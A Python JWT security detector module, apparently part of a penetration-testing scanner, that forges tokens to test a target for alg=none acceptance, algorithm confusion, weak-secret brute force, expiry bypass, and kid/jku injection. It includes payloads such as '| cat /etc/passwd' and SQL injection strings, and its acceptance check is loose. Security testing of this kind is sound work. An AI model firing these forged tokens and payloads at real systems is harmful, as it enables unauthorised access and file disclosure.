"""
JWT 安全检测器

检测 JWT 实现中的安全漏洞:
- 算法混淆 (none algorithm, HS256→RS256)
- 弱密钥爆破
- 过期验证绕过
- kid 注入
- jku/x5u 注入
"""

import base64
import hashlib
import hmac
import json
import logging
from typing import Any, Dict, List, Optional

from ..base import BaseDetector
from ..factory import register_detector
from ..result import DetectionResult, DetectorType, Severity

logger = logging.getLogger(__name__)


# 常见弱密钥列表
WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "private",
    "jwt_secret",
    "jwt-secret",
    "jwtSecret",
    "secret_key",
    "secretkey",
    "changeme",
    "changeit",
    "test",
    "dev",
    "development",
    "production",
    "your-256-bit-secret",
    "your-secret-key",
    "my-secret-key",
    "supersecret",
    "super_secret",
    "topsecret",
    "top_secret",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "1234567890",
    "0123456789",
    "abcdefgh",
    "12345678",
    "",
    " ",
    "null",
    "none",
    "undefined",
    "default",
]


def _b64_encode(data: bytes) -> str:
    """Base64 URL 安全编码（无填充）"""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64_decode(data: str) -> bytes:
    """Base64 URL 安全解码"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _parse_jwt(token: str) -> Optional[Dict[str, Any]]:
    """解析 JWT token"""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64_decode(parts[0]))
        payload = json.loads(_b64_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2], "parts": parts}
    except (json.JSONDecodeError, ValueError, UnicodeDecodeError):
        return None


def _sign_hs256(message: str, secret: str) -> str:
    """使用 HS256 签名"""
    sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    return _b64_encode(sig)


def _forge_token(header: Dict, payload: Dict, secret: str = "", alg: str = "none") -> str:
    """伪造 JWT token"""
    header = {**header, "alg": alg}
    h = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    if alg.lower() == "none":
        return f"{h}.{p}."
    elif alg.upper() in ("HS256", "HS384", "HS512"):
        sig = _sign_hs256(f"{h}.{p}", secret)
        return f"{h}.{p}.{sig}"
    return f"{h}.{p}."


@register_detector("jwt")
class JWTDetector(BaseDetector):
    """JWT 安全检测器

    检测 JWT 实现中的多种安全漏洞

    使用示例:
        detector = JWTDetector()
        results = detector.detect(url, token="eyJ...")
    """

    name = "jwt"
    description = "JWT 安全漏洞检测器"
    vuln_type = "jwt_vulnerability"
    severity = Severity.CRITICAL
    detector_type = DetectorType.AUTH
    version = "1.0.0"

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.weak_secrets = self.config.get("weak_secrets", WEAK_SECRETS)
        self.check_none_alg = self.config.get("check_none_alg", True)
        self.check_alg_confusion = self.config.get("check_alg_confusion", True)
        self.check_weak_secret = self.config.get("check_weak_secret", True)
        self.check_exp_bypass = self.config.get("check_exp_bypass", True)
        self.check_kid_injection = self.config.get("check_kid_injection", True)
        self.check_jku_injection = self.config.get("check_jku_injection", True)
        self.callback_url = self.config.get("callback_url", "")

    def detect(self, url: str, **kwargs) -> List[DetectionResult]:
        """检测 JWT 安全漏洞

        Args:
            url: 目标 URL
            **kwargs:
                token: JWT token
                header_name: 存放 token 的 header 名称 (默认 Authorization)
                auth_prefix: token 前缀 (默认 Bearer)

        Returns:
            检测结果列表
        """
        self._log_detection_start(url)
        results: List[DetectionResult] = []

        token = kwargs.get("token", "")
        header_name = kwargs.get("header_name", "Authorization")
        auth_prefix = kwargs.get("auth_prefix", "Bearer")
        headers = kwargs.get("headers", {})

        # 如果没有提供 token，尝试从 headers 中提取
        if not token and header_name in headers:
            auth_value = headers[header_name]
            if auth_value.startswith(f"{auth_prefix} "):
                token = auth_value[len(auth_prefix) + 1 :]

        if not token:
            logger.warning("未提供 JWT token")
            self._log_detection_end(url, results)
            return results

        parsed = _parse_jwt(token)
        if not parsed:
            logger.warning("无效的 JWT token 格式")
            self._log_detection_end(url, results)
            return results

        # 获取基线响应
        baseline = self._get_baseline(url, token, header_name, auth_prefix, headers)

        # 执行各项检测
        if self.check_none_alg:
            results.extend(
                self._test_none_algorithm(url, parsed, header_name, auth_prefix, headers, baseline)
            )

        if self.check_alg_confusion:
            results.extend(
                self._test_algorithm_confusion(
                    url, parsed, header_name, auth_prefix, headers, baseline
                )
            )

        if self.check_weak_secret:
            results.extend(
                self._test_weak_secret(url, parsed, header_name, auth_prefix, headers, baseline)
            )

        if self.check_exp_bypass:
            results.extend(
                self._test_exp_bypass(url, parsed, header_name, auth_prefix, headers, baseline)
            )

        if self.check_kid_injection:
            results.extend(
                self._test_kid_injection(url, parsed, header_name, auth_prefix, headers, baseline)
            )

        if self.check_jku_injection:
            results.extend(
                self._test_jku_injection(url, parsed, header_name, auth_prefix, headers, baseline)
            )

        self._log_detection_end(url, results)
        return results

    def _get_baseline(
        self, url: str, token: str, header_name: str, auth_prefix: str, headers: Dict
    ) -> Optional[Any]:
        """获取有效 token 的基线响应"""
        test_headers = {**headers, header_name: f"{auth_prefix} {token}"}
        return self._safe_request("GET", url, headers=test_headers)

    def _test_with_token(
        self, url: str, token: str, header_name: str, auth_prefix: str, headers: Dict
    ) -> Optional[Any]:
        """使用指定 token 发送请求"""
        test_headers = {**headers, header_name: f"{auth_prefix} {token}"}
        return self._safe_request("GET", url, headers=test_headers)

    def _is_accepted(self, response: Any, baseline: Optional[Any]) -> bool:
        """判断 token 是否被接受"""
        if response is None:
            return False
        # 200/201/204 视为接受
        if response.status_code in (200, 201, 204):
            return True
        # 如果基线是 200 且响应也是 200，检查内容相似度
        if baseline and baseline.status_code == 200 and response.status_code == 200:
            return True
        return False

    def _test_none_algorithm(
        self,
        url: str,
        parsed: Dict,
        header_name: str,
        auth_prefix: str,
        headers: Dict,
        baseline: Any,
    ) -> List[DetectionResult]:
        """测试 none 算法漏洞"""
        results = []
        for alg in ["none", "None", "NONE", "nOnE"]:
            forged = _forge_token(parsed["header"], parsed["payload"], alg=alg)
            response = self._test_with_token(url, forged, header_name, auth_prefix, headers)
            if self._is_accepted(response, baseline):
                results.append(
                    self._create_result(
                        url=url,
                        vulnerable=True,
                        payload=f"alg={alg}",
                        evidence=f"服务器接受 alg={alg} 的 token，状态码: {response.status_code}",
                        confidence=0.95,
                        verified=True,
                        remediation="禁止接受 alg=none 的 JWT，使用白名单验证算法",
                        references=["https://cwe.mitre.org/data/definitions/327.html"],
                        extra={
                            "attack_type": "none_algorithm",
                            "forged_token": forged[:50] + "...",
                        },
                    )
                )
                return results
        return results

    def _test_algorithm_confusion(
        self,
        url: str,
        parsed: Dict,
        header_name: str,
        auth_prefix: str,
        headers: Dict,
        baseline: Any,
    ) -> List[DetectionResult]:
        """测试算法混淆漏洞 (RS256 → HS256)"""
        results = []
        original_alg = parsed["header"].get("alg", "").upper()
        # 仅当原始算法是 RS* 时测试
        if not original_alg.startswith("RS"):
            return results

        # 尝试使用空密钥或公钥作为 HMAC 密钥
        for secret in ["", "public_key"]:
            forged = _forge_token(parsed["header"], parsed["payload"], secret=secret, alg="HS256")
            response = self._test_with_token(url, forged, header_name, auth_prefix, headers)
            if self._is_accepted(response, baseline):
                results.append(
                    self._create_result(
                        url=url,
                        vulnerable=True,
                        payload="RS256 → HS256",
                        evidence=f"服务器接受算法混淆攻击，状态码: {response.status_code}",
                        confidence=0.90,
                        verified=True,
                        remediation="验证 JWT 时强制指定算法，不信任 header 中的 alg 字段",
                        references=[
                            "https://auth0.com/blog"
                            "/critical-vulnerabilities-in-json-web-token-libraries/"
                        ],
                        extra={"attack_type": "algorithm_confusion", "original_alg": original_alg},
                    )
                )
                return results
        return results

    def _test_weak_secret(
        self,
        url: str,
        parsed: Dict,
        header_name: str,
        auth_prefix: str,
        headers: Dict,
        baseline: Any,
    ) -> List[DetectionResult]:
        """测试弱密钥"""
        results = []
        original_alg = parsed["header"].get("alg", "").upper()
        if not original_alg.startswith("HS"):
            return results

        for secret in self.weak_secrets:
            forged = _forge_token(
                parsed["header"], parsed["payload"], secret=secret, alg=original_alg
            )
            response = self._test_with_token(url, forged, header_name, auth_prefix, headers)
            if self._is_accepted(response, baseline):
                results.append(
                    self._create_result(
                        url=url,
                        vulnerable=True,
                        payload=f"secret={secret!r}",
                        evidence=f"发现弱密钥: {secret!r}",
                        confidence=0.99,
                        verified=True,
                        remediation="使用强随机密钥 (至少 256 位)，定期轮换密钥",
                        references=["https://cwe.mitre.org/data/definitions/521.html"],
                        extra={"attack_type": "weak_secret", "secret": secret},
                    )
                )
                return results
        return results

    def _test_exp_bypass(
        self,
        url: str,
        parsed: Dict,
        header_name: str,
        auth_prefix: str,
        headers: Dict,
        baseline: Any,
    ) -> List[DetectionResult]:
        """测试过期验证绕过"""
        results = []
        payload = parsed["payload"].copy()

        # 测试移除 exp
        if "exp" in payload:
            del payload["exp"]
            # 需要知道密钥才能签名，这里只测试 none 算法
            forged = _forge_token(parsed["header"], payload, alg="none")
            response = self._test_with_token(url, forged, header_name, auth_prefix, headers)
            if self._is_accepted(response, baseline):
                results.append(
                    self._create_result(
                        url=url,
                        vulnerable=True,
                        payload="removed exp claim",
                        evidence="服务器接受无 exp 声明的 token",
                        confidence=0.85,
                        verified=True,
                        remediation="强制验证 exp 声明，拒绝无过期时间的 token",
                        extra={"attack_type": "exp_bypass"},
                    )
                )
                return results

        # 测试设置极大的 exp
        payload = parsed["payload"].copy()
        payload["exp"] = 9999999999
        forged = _forge_token(parsed["header"], payload, alg="none")
        response = self._test_with_token(url, forged, header_name, auth_prefix, headers)
        if self._is_accepted(response, baseline):
            results.append(
                self._create_result(
                    url=url,
                    vulnerable=True,
                    payload="exp=9999999999",
                    evidence="服务器接受超长过期时间的 token",
                    confidence=0.80,
                    verified=True,
                    remediation="限制 token 最大有效期",
                    extra={"attack_type": "exp_bypass"},
                )
            )
        return results

    def _test_kid_injection(
        self,
        url: str,
        parsed: Dict,
        header_name: str,
        auth_prefix: str,
        headers: Dict,
        baseline: Any,
    ) -> List[DetectionResult]:
        """测试 kid 注入"""
        results = []
        kid_payloads = [
            ("../../dev/null", "path_traversal"),
            ("| cat /etc/passwd", "command_injection"),
            ("' OR '1'='1", "sql_injection"),
            ("../../../etc/passwd", "path_traversal"),
            ("key' UNION SELECT 'secret'--", "sql_injection"),
        ]

        for kid_payload, attack_type in kid_payloads:
            header = {**parsed["header"], "kid": kid_payload}
            # kid 注入通常需要配合 none 算法或已知密钥
            forged = _forge_token(header, parsed["payload"], alg="none")
            response = self._test_with_token(url, forged, header_name, auth_prefix, headers)
            if self._is_accepted(response, baseline):
                results.append(
                    self._create_result(
                        url=url,
                        vulnerable=True,
                        payload=f"kid={kid_payload}",
                        evidence=f"可能存在 kid {attack_type} 漏洞",
                        confidence=0.75,
                        verified=False,
                        remediation="对 kid 参数进行严格验证，使用白名单",
                        references=["https://cwe.mitre.org/data/definitions/22.html"],
                        extra={"attack_type": f"kid_{attack_type}", "kid": kid_payload},
                    )
                )
                return results
        return results

    def _test_jku_injection(
        self,
        url: str,
        parsed: Dict,
        header_name: str,
        auth_prefix: str,
        headers: Dict,
        baseline: Any,
    ) -> List[DetectionResult]:
        """测试 jku/x5u 注入"""
        results = []
        if not self.callback_url:
            return results

        for header_field in ["jku", "x5u"]:
            header = {**parsed["header"], header_field: self.callback_url}
            forged = _forge_token(header, parsed["payload"], alg="none")
            response = self._test_with_token(url, forged, header_name, auth_prefix, headers)
            # jku/x5u 注入需要检查回调是否被访问
            if response and response.status_code != 401:
                results.append(
                    self._create_result(
                        url=url,
                        vulnerable=True,
                        payload=f"{header_field}={self.callback_url}",
                        evidence=f"服务器可能处理了 {header_field} 字段 (需验证回调)",
                        confidence=0.60,
                        verified=False,
                        remediation=f"禁用或严格验证 {header_field} 字段，使用白名单",
                        references=["https://cwe.mitre.org/data/definitions/918.html"],
                        extra={
                            "attack_type": f"{header_field}_injection",
                            "callback": self.callback_url,
                        },
                    )
                )
        return results

    def get_payloads(self) -> List[str]:
        """获取检测器使用的 payload 列表"""
        return ["alg=none", "RS256→HS256"] + [f"secret={s}" for s in self.weak_secrets[:5]]
